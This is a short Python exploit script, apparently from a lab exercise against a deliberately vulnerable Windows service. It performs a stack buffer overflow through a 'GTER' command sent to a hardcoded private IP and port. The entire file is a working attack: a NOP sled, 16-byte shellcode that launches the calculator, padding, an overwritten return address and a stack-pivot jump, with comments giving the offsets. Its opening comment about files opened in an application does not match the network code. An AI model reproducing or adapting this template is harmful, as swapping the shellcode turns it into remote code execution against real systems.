#!/usr/bin/python -w

# Skeleton exploit for files, which are opened in application

import socket
import os
import sys
from struct import pack

host="192.168.85.133"
port=9999

# spawn calc on windows - 16 bytes
payload = "\x31\xc9\x51\x68\x63\x61\x6c\x63\x54\xb8\xc7\x93\xc2\x77\xff\xd0" 

jmp = payload 
eip = pack('i', 0x62501205)
buffer = "GTER " + "\x90"*40 + payload + "A"*95 + eip + "\x83\xec\x7f\xff\xe4" + "A"*1000   

# appear to have 168 bytes of space only. 
# eip offset @ 151
# esp offset @ 20
# 83EC70            sub esp,byte +0x70

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
print(sock.recv(1024))
sock.send(buffer)
print(sock.recv(1024))
sock.close()

